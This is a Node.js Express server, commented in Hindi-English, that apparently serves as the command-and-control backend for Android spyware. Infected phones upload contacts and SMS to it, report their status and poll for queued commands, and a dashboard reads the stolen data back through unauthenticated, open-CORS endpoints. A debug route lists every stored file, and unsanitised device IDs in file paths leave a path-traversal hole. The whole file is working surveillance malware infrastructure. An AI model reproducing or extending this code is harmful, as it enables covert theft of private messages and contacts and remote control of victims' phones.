const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// --- 🛑 MAGIC: AUTO FOLDER CREATOR 🛑 ---
const foldersToCreate = ['data', 'uploads'];
const DATA_DIR = path.join(__dirname, 'data');

foldersToCreate.forEach(folderName => {
    const folderPath = path.join(__dirname, folderName);
    if (!fs.existsSync(folderPath)) {
        fs.mkdirSync(folderPath, { recursive: true });
        console.log(`✅ MAGIC: '${folderName}' folder khud se ban gaya!`);
    }
});
// ----------------------------------------

app.use(cors());
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ limit: '50mb', extended: true }));
app.use(express.static(__dirname));

let deviceState = {}; 

// ==========================================
// 🕵️‍♂️ JASOOSI SECTION (DEBUGGING TOOLS)
// ==========================================

// 1. Check karo ki Server ke folder mein kya files hain
app.get('/api/debug/check-files', (req, res) => {
    fs.readdir(DATA_DIR, (err, files) => {
        if (err) {
            return res.json({ error: "Folder read nahi kar paya", details: err.message });
        }
        // Har file ka size bhi batayega
        const fileDetails = files.map(file => {
            const stats = fs.statSync(path.join(DATA_DIR, file));
            return { name: file, size: stats.size + " bytes" };
        });
        res.json({
            message: "Server par ye files mili hain:",
            total_files: files.length,
            files: fileDetails
        });
    });
});

// 2. Test karo ki Server par write permission hai ya nahi
app.get('/api/debug/test-write', (req, res) => {
    try {
        fs.writeFileSync(path.join(DATA_DIR, 'test_file.txt'), "Hello! Server is working.");
        res.send("✅ Server OK! Main file likh sakta hoon.");
    } catch (err) {
        res.send("❌ Server Error! Main file nahi likh pa raha: " + err.message);
    }
});
// ==========================================


// --- DASHBOARD API ---
app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || { isOnline: false };
    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 60000 : false; // 60 sec timeout
    res.json({ ...state, isOnline });
});

app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!deviceState[device_id]) deviceState[device_id] = {};
    deviceState[device_id].currentCommand = command;
    console.log(`🚀 Command Queued: ${command} for ${device_id}`);
    res.json({ status: "success" });
});


// --- ANDROID APP API ---

// 1. Upload Data (Contacts, SMS, etc.)
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body;

    // --- LOGGING ---
    console.log(`📡 Incoming Data Request -> Device: ${device_id}, Type: ${type}`);

    if (!device_id || !type || !data) {
        console.log("❌ Error: Data Missing in Request!");
        return res.status(400).send("Data missing");
    }

    // --- FIX: Sab kuch lowercase kar diya taaki spelling mistake na ho ---
    // Agar phone ne 'Contacts' bheja, hum 'contacts' save karenge
    const cleanType = type.toLowerCase(); 
    const fileName = `${device_id}_${cleanType}.json`;
    const filePath = path.join(DATA_DIR, fileName);
    
    try {
        let finalData;
        try {
            // Agar data string hai to JSON banao
            finalData = JSON.parse(data);
        } catch(e) {
            // Agar pehle se JSON hai to waisa hi rehne do
            finalData = data;
        }

        fs.writeFileSync(filePath, JSON.stringify(finalData, null, 2));
        
        console.log(`✅ [SUCCESS] File Saved: ${fileName}`);
        console.log(`📊 Data Size: ${JSON.stringify(finalData).length} characters`);
        
        res.send("Success");
    } catch (err) {
        console.error("❌ Save Error:", err);
        res.status(500).send("Error saving data");
    }
});

// 2. Battery & Status
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    
    if (device_id) {
        deviceState[device_id] = {
            model: model || "Android",
            android_version: android_version || "--",
            battery: battery || 0,
            ringerMode: ringerMode || "normal",
            lastSeen: Date.now(),
            currentCommand: deviceState[device_id]?.currentCommand || "none"
        };
        // Sirf tab log karo jab zaroori ho, spam kam karne ke liye
        // console.log(`🔋 Status: ${device_id} (${battery}%)`);
    }
    res.send("Updated");
});

// 3. Command Get
app.get('/api/get-command/:device_id', (req, res) => {
    const deviceId = req.params.device_id;
    const cmd = deviceState[deviceId]?.currentCommand || "none";
    
    if (cmd !== "none") {
        deviceState[deviceId].currentCommand = "none";
        console.log(`📤 Sending Command to Phone: ${cmd}`);
    }
    
    res.send(cmd); 
});

// 4. Fetch Data for Website
app.get('/api/get-data/:deviceId/:type', (req, res) => {
    // Website kuch bhi maange, hum lowercase me dhoondenge
    const cleanType = req.params.type.toLowerCase();
    const fileName = `${req.params.deviceId}_${cleanType}.json`;
    const filePath = path.join(DATA_DIR, fileName);

    console.log(`🔍 Website requesting: ${fileName}`);

    if (fs.existsSync(filePath)) {
        res.sendFile(filePath);
    } else {
        console.log(`⚠️ File not found: ${fileName}`);
        res.json([]);
    }
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server is running on port ${PORT}`);
    console.log(`🕵️‍♂️ Check files at: /api/debug/check-files`);
});
